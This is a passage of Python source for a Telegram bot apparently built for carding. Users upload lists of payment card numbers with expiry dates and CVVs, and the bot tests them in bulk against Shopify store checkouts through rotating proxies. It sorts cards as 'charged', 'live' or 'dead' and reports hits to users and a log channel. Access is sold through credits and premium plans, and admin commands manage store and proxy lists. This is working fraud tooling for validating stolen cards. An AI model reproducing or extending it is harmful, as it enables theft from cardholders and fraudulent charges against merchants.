        return await event.reply("📎 Reply to a .txt file containing cards...", parse_mode='html')
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        return await event.reply("❌ Please reply to a .txt file.", parse_mode='html')
    
    if not load_sites():
        return await event.reply("❌ No sites available. Contact admin.", parse_mode='html')
    if not load_proxies():
        return await event.reply("❌ No proxies available. Please add proxies.", parse_mode='html')
    
    status_msg = await event.reply("✅ Processing your file...", parse_mode='html')
    
    file_path = await reply_msg.download_media()
    
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    
    cards = extract_cc(content)
    
    if not cards:
        await status_msg.edit("⚠️ No valid cards found in file.", parse_mode='html')
        try:
            os.remove(file_path)
        except Exception:
            pass
        return
    
    if len(cards) > 50000:
        await status_msg.edit(
            f"⚠️ File contains {len(cards)} cards. Limiting to first 50000 cards.",
            parse_mode='html'
        )
        cards = cards[:50000]
    
    try:
        os.remove(file_path)
    except Exception:
        pass
    
    total_cards = len(cards)
    
    if not is_group_enabled_check:
        user_credits = get_user_credits(user_id)
        if user_credits < total_cards:
            return await status_msg.edit(
                f"❌ <b>Insufficient Credits!</b>\n\n"
                f"You need {total_cards} credits to check {total_cards} cards.\n"
                f"Your available credits: {user_credits}\n\n"
                f"Use /redeemcredit CREDIT_KEY to add more credits.",
                parse_mode='html'
            )
    else:
        user_credits = "Free"
    
    filter_info = f"🔥 Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}"
    credit_info = f"{user_credits} (Will deduct 1 per card)" if not is_group_enabled_check else "Free (Group Mode)"
    await status_msg.edit(
        f"✅ Starting check for {total_cards} cards...\n{filter_info}\n💰 Credits: {credit_info}",
        parse_mode='html'
    )
    
    if user_id in _user_active_sessions and not is_admin(user_id):
        return await status_msg.edit(
            "⚠️ <b>You already have an active checking session!</b>\n\n"
            "Wait for it to finish or use the 🛑 Stop button.",
            parse_mode='html'
        )
    _user_active_sessions[user_id] = True

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    
    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time()
    }
    
    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        
        last_update_count = 0
        UPDATE_EVERY_CARDS = 10
        
        async def worker():
            nonlocal last_update_count
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                    
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                    
                current_sites = load_sites()
                current_proxies = load_proxies()
                if not current_sites or not current_proxies:
                    break
                
                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
                
                all_results['checked'] += 1
                
                if not is_group_enabled_check:
                    success, new_credits = deduct_credit(user_id)
                else:
                    success = True
                    new_credits = "Free"
                
                is_charged = (
                    res['status'] == 'Charged' or
                    'order completed' in res.get('message', '').lower() or
                    'order_placed' in res.get('message', '').lower() or
                    'ORDER_PLACED' in res.get('message', '') or
                    'thank you' in res.get('message', '').lower() or
                    'payment successful' in res.get('message', '').lower()
                )
                
                if is_charged:
                    all_results['charged'].append(res)
                    record_hit(user_id, 'charged')
                    try:
                        sender = await event.get_sender()
                        username = sender.username if sender.username else None
                        await send_log_to_channel(
                            res['message'][:150],
                            res.get('gateway', 'Unknown'),
                            res.get('price', '-'),
                            username, user_id
                        )
                    except Exception:
                        await send_log_to_channel(
                            res['message'][:150],
                            res.get('gateway', 'Unknown'),
                            res.get('price', '-'),
                            str(user_id), user_id
                        )
                    await send_realtime_hit_to_user(
                        user_id, "CHARGED", card,
                        res['message'][:150],
                        res.get('gateway', 'Unknown'),
                        res.get('price', '-')
                    )
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    record_hit(user_id, 'approved')
                    await send_realtime_hit_to_user(
                        user_id, "LIVE", card,
                        res['message'][:150],
                        res.get('gateway', 'Unknown'),
                        res.get('price', '-')
                    )
                else:
                    all_results['dead'].append(res)
                    record_dead(user_id)
                    
                queue.task_done()
                
                if all_results['checked'] - last_update_count >= UPDATE_EVERY_CARDS:
                    last_update_count = all_results['checked']
                    if session_key in active_sessions:
                        try:
                            await update_progress(
                                user_id, status_msg.id, all_results, all_results['checked']
                            )
                        except Exception:
                            pass
        
        workers = [asyncio.create_task(worker()) for _ in range(10)]
        
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        
        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
        
    except Exception as e:
        await bot.send_message(user_id, f"An error occurred: {e}", parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        _user_active_sessions.pop(user_id, None)
        
        try:
            await status_msg.delete()
        except Exception:
            pass
        
        await send_final_results(user_id, all_results)
        if not is_group_enabled_check:
            await check_credits_low(user_id)


# ========== /multi COMMAND (Check up to 10 cards at once) ==========

@bot.on(events.NewMessage(pattern=r'^/multi(@\w+)?(\s+.*)?$'))
async def multi_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    if not is_premium(user_id) and not is_admin(user_id):
        return await event.reply(
            "❌ <b>Premium Required!</b>\n\n"
            "Use /redeem to activate premium access.",
            parse_mode='html'
        )
    
    try:
        card_input = re.sub(r'^/multi(@\w+)?(\s+)', '', event.message.text).strip()
    except Exception:
        return await event.reply(
            "❌ Usage: <code>/multi card1|mm|yy|cvv card2|mm|yy|cvv ...</code>\n\n"
            "Max 10 cards at once.",
            parse_mode='html'
        )
    
    cards = extract_cc(card_input)
    
    if not cards:
        return await event.reply(
            "❌ No valid cards found. Use format: <code>card|mm|yy|cvv</code>",
            parse_mode='html'
        )
    
    cards = cards[:10]
    total_cards = len(cards)
    
    user_credits = get_user_credits(user_id)
    if user_credits < total_cards:
        return await event.reply(
            f"❌ <b>Insufficient Credits!</b>\n\n"
            f"You need {total_cards} credits to check {total_cards} cards.\n"
            f"Your available credits: {user_credits}",
            parse_mode='html'
        )
    
    status_msg = await event.reply(f"🔥 Checking {total_cards} cards...", parse_mode='html')
    
    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        return await status_msg.edit("❌ Sites or proxies not available.", parse_mode='html')
    
    all_results = {'charged': [], 'approved': [], 'dead': [], 'total': total_cards}
    
    async def check_one_card(card):
        result = await check_card_with_retry(card, sites, proxies, max_retries=2)
        
        success, new_credits = deduct_credit(user_id)
        
        is_charged = (
            result['status'] == 'Charged' or
            'order completed' in result.get('message', '').lower() or
            'order_placed' in result.get('message', '').lower() or
            'ORDER_PLACED' in result.get('message', '') or
            'thank you' in result.get('message', '').lower() or
            'payment successful' in result.get('message', '').lower()
        )
        
        if is_charged:
            all_results['charged'].append(result)
            record_hit(user_id, 'charged')
            await send_log_to_channel(
                result['message'][:150],
                result.get('gateway', 'Unknown'),
                result.get('price', '-'),
                str(user_id), user_id
            )
            await send_realtime_hit_to_user(
                user_id, "CHARGED", card,
                result['message'][:150],
                result.get('gateway', 'Unknown'),
                result.get('price', '-')
            )
        elif result['status'] == 'Approved':
            all_results['approved'].append(result)
            record_hit(user_id, 'approved')
            await send_realtime_hit_to_user(
                user_id, "LIVE", card,
                result['message'][:150],
                result.get('gateway', 'Unknown'),
                result.get('price', '-')
            )
        else:
            all_results['dead'].append(result)
            record_dead(user_id)
    
    tasks = [check_one_card(card) for card in cards]
    await asyncio.gather(*tasks)
    
    charged_count = len(all_results['charged'])
    approved_count = len(all_results['approved'])
    dead_count = len(all_results['dead'])
    
    summary = (
        f"<b>🔥 Multi Check Results</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>🏆 Summary</b>\n"
        f"<blockquote>🔥 Total: {total_cards}\n"
        f"💣 Charged: {charged_count}\n"
        f"✅ Live: {approved_count}\n"
        f"❌ Dead: {dead_count}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
    )
    
    if all_results['charged']:
        summary += "\n<b>💣 CHARGED:</b>"
        for r in all_results['charged']:
            summary += (
                f"\n<blockquote>💣 <code>{r['card']}</code>\n"
                f"✅ {r.get('gateway', 'Unknown')} | 💰 {r.get('price', '-')}\n"
                f"📝 {r['message'][:80]}</blockquote>"
            )
    
    if all_results['approved']:
        summary += f"\n<b>✅ LIVE ({approved_count}):</b>"
        for r in all_results['approved'][:5]:
            summary += f"\n<blockquote>✅ <code>{r['card']}</code> | {r.get('gateway', 'Unknown')}</blockquote>"
        if approved_count > 5:
            summary += f"\n<blockquote>... and {approved_count - 5} more</blockquote>"
    
    summary += (
        f"\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"💰 <b>Credits Left: {get_user_credits(user_id)}</b>\n"
        f'\n🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
    )
    
    await status_msg.edit(summary, parse_mode='html')
    await check_credits_low(user_id)


# ========== /mcc COMMAND (Check 1 card on ALL sites) ==========

@bot.on(events.NewMessage(pattern=r'^/mcc(@\w+)?(\s+.*)?$'))
async def mcc_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    if not is_premium(user_id) and not is_admin(user_id):
        return await event.reply(
            "❌ <b>Premium Required!</b>\n\n"
            "Use /redeem to activate premium access.",
            parse_mode='html'
        )
    
    try:
        card_input = re.sub(r'^/mcc(@\w+)?(\s+)', '', event.message.text).strip()
    except Exception:
        return await event.reply("❌ Usage: <code>/mcc card|mm|yy|cvv</code>", parse_mode='html')
    
    cards = extract_cc(card_input)
    if not cards:
        return await event.reply(
            "❌ Invalid CC format. Use: <code>/mcc card|mm|yy|cvv</code>",
            parse_mode='html'
        )
    
    card = cards[0]
    
    sites = load_sites()
    if not sites:
        return await event.reply("❌ No sites available.", parse_mode='html')
    
    user_proxies = get_user_specific_proxies(user_id)
    if user_proxies:
        proxies = user_proxies
    else:
        proxies = load_proxies()
    
    if not proxies:
        return await event.reply("❌ No proxies available.", parse_mode='html')
    
    user_credits = get_user_credits(user_id)
    if user_credits < len(sites):
        return await event.reply(
            f"❌ <b>Insufficient Credits!</b>\n\n"
            f"Need {len(sites)} credits (1 per site) but you only have {user_credits}.",
            parse_mode='html'
        )
    
    status_msg = await event.reply(
        f"🔥 Checking 1 card on <b>{len(sites)} sites</b>...",
        parse_mode='html'
    )
    
    charged_results = []
    approved_results = []
    dead_sites_count = 0
    
    async def check_card_on_site(site):
        nonlocal dead_sites_count
        result = await check_card(card, site, random.choice(proxies))
        success, new_credits = deduct_credit(user_id)
        
        is_charged = (
            result['status'] == 'Charged' or
            'order completed' in result.get('message', '').lower() or
            'order_placed' in result.get('message', '').lower() or
            'ORDER_PLACED' in result.get('message', '') or
            'thank you' in result.get('message', '').lower() or
            'payment successful' in result.get('message', '').lower()
        )
        
        if is_charged:
            charged_results.append(result)
            record_hit(user_id, 'charged')
            await send_log_to_channel(
                result['message'][:150],
                result.get('gateway', 'Unknown'),
                result.get('price', '-'),
                str(user_id), user_id
            )
            await send_realtime_hit_to_user(
                user_id, "CHARGED", card,
                result['message'][:150],
                result.get('gateway', 'Unknown'),
                result.get('price', '-')
            )
        elif result['status'] == 'Approved':
            approved_results.append(result)
            record_hit(user_id, 'approved')
            await send_realtime_hit_to_user(
                user_id, "LIVE", card,
                result['message'][:150],
                result.get('gateway', 'Unknown'),
                result.get('price', '-')
            )
        elif result.get('retry'):
            dead_sites_count += 1
    
    tasks = [check_card_on_site(site) for site in sites]
    await asyncio.gather(*tasks)
    
    summary = (
        f"<b>🔥 MASS Site Check Results</b>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>🏆 Summary</b>\n"
        f"<blockquote>💳 Card: <code>{card}</code>\n"
        f"✅ Sites Checked: {len(sites)}\n"
        f"💣 Charged: {len(charged_results)}\n"
        f"✅ Live: {len(approved_results)}\n"
        f"❌ Dead/Site Errors: {dead_sites_count}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
    )
    
    if charged_results:
        summary += "\n<b>💣 CHARGED HITS:</b>"
        for r in charged_results:
            summary += (
                f"\n<blockquote>💣 <code>{card}</code>\n"
                f"✅ {r.get('gateway', 'Unknown')} | 💰 {r.get('price', '-')}\n"
                f"📝 Site: <code>{r.get('site', 'Unknown')}</code>\n"
                f"📝 {r['message'][:80]}</blockquote>"
            )
    
    if approved_results:
        summary += f"\n<b>✅ LIVE ({len(approved_results)}):</b>"
        shown = 0
        for r in approved_results[:10]:
            summary += (
                f"\n<blockquote>✅ {r.get('gateway', 'Unknown')} | "
                f"💰 {r.get('price', '-')} | <code>{r.get('site', 'Unknown')}</code></blockquote>"
            )
            shown += 1
        if len(approved_results) > shown:
            summary += f"\n<blockquote>... and {len(approved_results) - shown} more</blockquote>"
    
    summary += (
        f"\n<b>━━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"💰 <b>Credits Left: {get_user_credits(user_id)}</b>\n"
        f'\n🛡 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>'
    )
    
    await status_msg.edit(summary, parse_mode='html')
    await check_credits_low(user_id)


# ========== /site COMMAND (Admin: check all sites & remove dead) ==========

@bot.on(events.NewMessage(pattern=r'^/site(@\w+)?(\s+.*)?$'))
async def site_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    sites = load_sites()
    if not sites:
        return await event.reply("❌ <code>sites.txt</code> is empty. Nothing to check.", parse_mode='html')
    
    proxies = load_proxies()
    if not proxies:
        return await event.reply("❌ No proxies available. Please add proxies.", parse_mode='html')
    
    status_msg = await event.reply(f"✅ Checking {len(sites)} sites...", parse_mode='html')
    
    alive_sites = []
    dead_sites = []
    batch_size = 10
    
    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies:
                fresh_proxies = proxies
            
            tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])
            
            await status_msg.edit(
                f"✅ Checking sites...\n\n"
                f"<b>Checked:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n"
                f"<b>Alive:</b> {len(alive_sites)}\n"
                f"<b>Dead:</b> {len(dead_sites)}",
                parse_mode='html'
            )
        
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
        
        summary_msg = (
            f"✅ <b>Site Check Complete!</b>\n\n"
            f"<b>Total Sites:</b> {len(sites)}\n"
            f"<b>Alive:</b> {len(alive_sites)}\n"
            f"<b>Removed:</b> {len(dead_sites)}\n\n"
            f"<code>sites.txt</code> has been updated."
        )
        
        await status_msg.edit(summary_msg, parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(f"❌ An error occurred: {e}", parse_mode='html')


# ========== ADMIN: ADD SITE ==========

@bot.on(events.NewMessage(pattern=r'^/addsite(@\w+)?(\s+.*)?$'))
async def add_site_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        return await event.reply(
            "❌ Usage: <code>/addsite https://store.myshopify.com</code>",
            parse_mode='html'
        )
    
    site = args[1].strip()
    success, msg = add_site(site)
    await event.reply(
        f"{'✅' if success else '❌'} <b>{msg}</b>\n\n<code>{site}</code>",
        parse_mode='html'
    )


# ========== ADMIN: ADD SITES FROM TXT ==========

@bot.on(events.NewMessage(pattern=r'^/addsitetxt(@\w+)?(\s+.*)?$'))
async def add_site_txt_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    if not event.reply_to_msg_id:
        return await event.reply("📎 Reply to a .txt file with sites (one per line)", parse_mode='html')
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        return await event.reply("❌ Please reply to a .txt file", parse_mode='html')
    
    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(file_path)
    except Exception as e:
        try:
            os.remove(file_path)
        except Exception:
            pass
        return await event.reply(f"❌ Error reading file: {e}", parse_mode='html')
    
    sites = [line.strip() for line in content.splitlines() if line.strip()]
    if not sites:
        return await event.reply("❌ No valid sites found in file", parse_mode='html')
    
    added, already = add_sites_bulk(sites)
    
    msg = f"<b>🏆 Sites Processed</b>\n\n"
    msg += f"✅ Added: {len(added)}\n"
    msg += f"⚠️ Already existed: {len(already)}\n"
    if added:
        msg += f"\n<u>Added sites:</u>\n"
        for s in added[:20]:
            msg += f"👉 <code>{s}</code>\n"
        if len(added) > 20:
            msg += f"... and {len(added)-20} more"
    
    await event.reply(msg, parse_mode='html')


# ========== ADMIN: REMOVE SITE ==========

@bot.on(events.NewMessage(pattern=r'^/rm(@\w+)?(\s+.*)?$'))
async def remove_site_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/rm https://site.com</code>", parse_mode='html')
    
    url_to_remove = args[1].strip()
    success, msg = remove_site(url_to_remove)
    
    await event.reply(
        f"{'✅' if success else '❌'} <b>{msg}</b>\n\n<code>{url_to_remove}</code>",
        parse_mode='html'
    )


# ========== ADMIN: CLEAR ALL SITES ==========

@bot.on(events.NewMessage(pattern=r'^/clearsite(@\w+)?(\s+.*)?$'))
async def clear_all_sites(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    current_sites = load_sites()
    count = len(current_sites)
    
    if count == 0:
        return await event.reply("❌ <code>sites.txt</code> is already empty.", parse_mode='html')
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"sites_backup_{user_id}_{timestamp}.txt"
    
    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for site in current_sites:
                await f.write(f"{site}\n")
        
        await event.reply(
            f"✅ <b>Backup Created!</b>\n\nSending backup of {count} sites before clearing...",
            file=backup_filename,
            parse_mode='html'
        )
        
        try:
            os.remove(backup_filename)
        except Exception:
            pass
    except Exception as e:
        return await event.reply(f"❌ Error creating backup: {e}", parse_mode='html')
    
    async with aiofiles.open(SITES_FILE, 'w') as f:
        await f.write("")
    
    await event.reply(
        f"✅ <b>Cleared all {count} sites!</b>\n\n<code>sites.txt</code> is now empty.",
        parse_mode='html'
    )


# ========== ADMIN: GET ALL SITES ==========

@bot.on(events.NewMessage(pattern=r'^/getsites(@\w+)?(\s+.*)?$'))
async def get_all_sites_cmd(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    current_sites = load_sites()
    if not current_sites:
        return await event.reply("❌ No sites in <code>sites.txt</code>", parse_mode='html')
    
    if len(current_sites) <= 50:
        site_list = "\n".join([f"{i+1}. <code>{s}</code>" for i, s in enumerate(current_sites)])
        await event.reply(
            f"<b>🏅 All Sites ({len(current_sites)}):</b>\n\n{site_list}",
            parse_mode='html'
        )
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"sites_{user_id}_{timestamp}.txt"
        
        async with aiofiles.open(filename, 'w') as f:
            for i, site in enumerate(current_sites):
                await f.write(f"{i+1}. {site}\n")
        
        await event.reply(
            f"<b>🏅 All Sites ({len(current_sites)}):</b>\n\nFile attached below.",
            file=filename,
            parse_mode='html'
        )
        
        try:
            os.remove(filename)
        except Exception:
            pass


# ========== /proxy COMMAND (Admin: check all proxies) ==========

@bot.on(events.NewMessage(pattern=r'^/proxy(@\w+)?(\s+)?$'))
async def proxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    proxies = load_proxies()
    if not proxies:
        return await event.reply("❌ <code>proxy.txt</code> is empty. Nothing to check.", parse_mode='html')
    
    status_msg = await event.reply(f"✅ Checking {len(proxies)} proxies...", parse_mode='html')
    
    alive_proxies = []
    dead_proxies = []
    batch_size = 50
    
    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])
            
            await status_msg.edit(
                f"✅ Checking proxies...\n\n"
                f"<b>Checked:</b> {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\n"
                f"<b>Alive:</b> {len(alive_proxies)}\n"
                f"<b>Dead:</b> {len(dead_proxies)}",
                parse_mode='html'
            )
        
        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")
        
        summary_msg = (
            f"✅ <b>Proxy Check Complete!</b>\n\n"
            f"<b>Total Proxies:</b> {len(proxies)}\n"
            f"<b>Alive:</b> {len(alive_proxies)}\n"
            f"<b>Removed:</b> {len(dead_proxies)}\n\n"
            f"<code>proxy.txt</code> has been updated with only working proxies."
        )
        
        await status_msg.edit(summary_msg, parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(f"❌ An error occurred: {e}", parse_mode='html')


# ========== /setproxy COMMAND (User: set personal proxy) ==========

@bot.on(events.NewMessage(pattern=r'^/setproxy(@\w+)?(\s+.*)?$'))
async def setproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    try:
        proxy = event.message.text.split(' ', 1)[1].strip()
    except IndexError:
        return await event.reply(
            "❌ Usage: <code>/setproxy proxy_ip:port</code>\n\n"
            "Example: /setproxy 1.2.3.4:8080",
            parse_mode='html'
        )
    
    if add_user_proxy(user_id, proxy):
        await event.reply(
            f"✅ <b>Proxy added successfully!</b>\n\n"
            f"<code>{proxy}</code>\n\n"
            f"You can now use /mcc command with this proxy.",
            parse_mode='html'
        )
    else:
        await event.reply(
            f"⚠️ <b>Proxy already exists!</b>\n\n<code>{proxy}</code>",
            parse_mode='html'
        )


# ========== /myproxy COMMAND (User: view personal proxies) ==========

@bot.on(events.NewMessage(pattern=r'^/myproxy(@\w+)?(\s+.*)?$'))
async def myproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    user_proxies = get_user_specific_proxies(user_id)
    if not user_proxies:
        return await event.reply(
            "❌ <b>You have no proxies set!</b>\n\nUse /setproxy to add a proxy.",
            parse_mode='html'
        )
    
    proxy_list = "\n".join([f"<code>{p}</code>" for p in user_proxies])
    await event.reply(
        f"<b>🔥 Your Personal Proxies:</b>\n\n{proxy_list}\n\nTotal: {len(user_proxies)}",
        parse_mode='html'
    )


# ========== /delmyproxy COMMAND (User: delete personal proxy) ==========

@bot.on(events.NewMessage(pattern=r'^/delmyproxy(@\w+)?(\s+.*)?$'))
async def delmyproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    try:
        proxy = event.message.text.split(' ', 1)[1].strip()
    except IndexError:
        return await event.reply(
            "❌ Usage: <code>/delmyproxy proxy_ip:port</code>\n\n"
            "Example: /delmyproxy 1.2.3.4:8080",
            parse_mode='html'
        )
    
    if remove_user_proxy(user_id, proxy):
        await event.reply(f"✅ <b>Proxy removed!</b>\n\n<code>{proxy}</code>", parse_mode='html')
    else:
        await event.reply(f"❌ <b>Proxy not found!</b>\n\n<code>{proxy}</code>", parse_mode='html')


# ========== /clearmyproxy COMMAND (User: clear all personal proxies) ==========

@bot.on(events.NewMessage(pattern=r'^/clearmyproxy(@\w+)?(\s+.*)?$'))
async def clearmyproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🔴 You are banned!", parse_mode='html')
    
    if clear_user_proxies(user_id):
        await event.reply("✅ <b>All your proxies have been cleared!</b>", parse_mode='html')
    else:
        await event.reply("⚠️ <b>You have no proxies to clear!</b>", parse_mode='html')

# ======================================================================
# PART 4: ADMIN COMMANDS + CALLBACKS + BOT STARTUP
# ======================================================================

# ========== ADMIN: ADD PREMIUM BY PLAN NAME ==========

@bot.on(events.NewMessage(pattern=r'^/addpremium(@\w+)?(\s+.*)?$'))
async def add_premium_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        await event.reply(
            "❌ Usage: <code>/addpremium user_id plan_name</code>\n\n"
            "<u>Available Plans:</u>\n"
            "👉 trial\n👉 bronze\n👉 silver\n👉 gold\n👉 platinum\n\n"
            "Example: <code>/addpremium 7415233736 platinum</code>",
            parse_mode='html'
        )
        return
    
    try:
        target_id = int(args[1])
        plan_key = args[2].lower()
        
        if plan_key not in PLANS:
            await event.reply(
                "❌ Invalid plan! Available: trial, bronze, silver, gold, platinum",
                parse_mode='html'
            )
            return
        
        plan_info = PLANS[plan_key]
        days = plan_info['days']
        credits = plan_info['credits']
        
        add_premium_user(target_id, plan_key, days, credits)
        
        await event.reply(
            f"✅ <b>Premium added!</b>\n\n"
            f"✅ User: <code>{target_id}</code>\n"
            f"🏅 Plan: {plan_info['name']}\n"
            f"⏳ Days: {days}\n"
            f"💰 Credits: {credits}",
            parse_mode='html'
        )
        
        try:
            expiry = datetime.now() + timedelta(days=days)
            await bot.send_message(
                target_id,
                f"🎉 <b>Premium Access Granted!</b>\n\n"
                f"🏅 Plan: {plan_info['name']}\n"
                f"⏳ You now have {days} days of premium access with {credits} credits!\n"
                f"📅 Expires: {expiry.strftime('%Y-%m-%d')}\n\n"
                f"Use /info to check your account.",
                parse_mode='html'
            )
        except Exception:
            pass
            
    except ValueError:
        await event.reply("❌ Invalid user_id!", parse_mode='html')


# ========== ADMIN: ADD CUSTOM PREMIUM ==========

@bot.on(events.NewMessage(pattern=r'^/addpremiumcustom(@\w+)?(\s+.*)?$'))
async def add_premium_custom_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 4:
        await event.reply(
            "❌ Usage: <code>/addpremiumcustom user_id days credits</code>\n\n"
            "Example: <code>/addpremiumcustom 7415233736 15 5000</code>",
            parse_mode='html'
        )
        return
    
    try:
        target_id = int(args[1])
        days = int(args[2])
        credits = int(args[3])
        
        if days <= 0 or credits <= 0:
            await event.reply("❌ Days and credits must be positive!", parse_mode='html')
            return
        
        add_premium_user(target_id, "custom", days, credits)
        
        await event.reply(
            f"✅ <b>Custom Premium added!</b>\n\n"
            f"✅ User: <code>{target_id}</code>\n"
            f"⏳ Days: {days}\n"
            f"💰 Credits: {credits}",
            parse_mode='html'
        )
        
        try:
            expiry = datetime.now() + timedelta(days=days)
            await bot.send_message(
                target_id,
                f"🎉 <b>Premium Access Granted!</b>\n\n"
                f"⏳ You now have {days} days of premium access with {credits} credits!\n"
                f"📅 Expires: {expiry.strftime('%Y-%m-%d')}\n\n"
                f"Use /info to check your account.",
                parse_mode='html'
            )
        except Exception:
            pass
            
    except ValueError:
        await event.reply("❌ Invalid user_id, days, or credits!", parse_mode='html')


# ========== ADMIN: ADD CREDITS ==========

@bot.on(events.NewMessage(pattern=r'^/addcredits(@\w+)?(\s+.*)?$'))
async def add_credits_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply("❌ Usage: <code>/addcredits user_id amount</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
        amount = int(args[2])
    except Exception:
        return await event.reply("❌ Invalid user_id or amount", parse_mode='html')
    
    add_credits(target_id, amount)
    new_total = get_user_credits(target_id)
    await event.reply(
        f"✅ <b>Credits Added!</b>\n\n"
        f"User: <code>{target_id}</code>\n"
        f"Added: {amount}\n"
        f"New Total: {new_total}",
        parse_mode='html'
    )
    
    try:
        await bot.send_message(
            target_id,
            f"💰 <b>{amount} Credits Added!</b>\n\nYour new balance: {new_total} credits",
            parse_mode='html'
        )
    except Exception:
        pass


# ========== ADMIN: REMOVE CREDITS ==========

@bot.on(events.NewMessage(pattern=r'^/removecredits(@\w+)?(\s+.*)?$'))
async def remove_credits_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply("❌ Usage: <code>/removecredits user_id amount</code>", parse_mode='html')
    
    try:
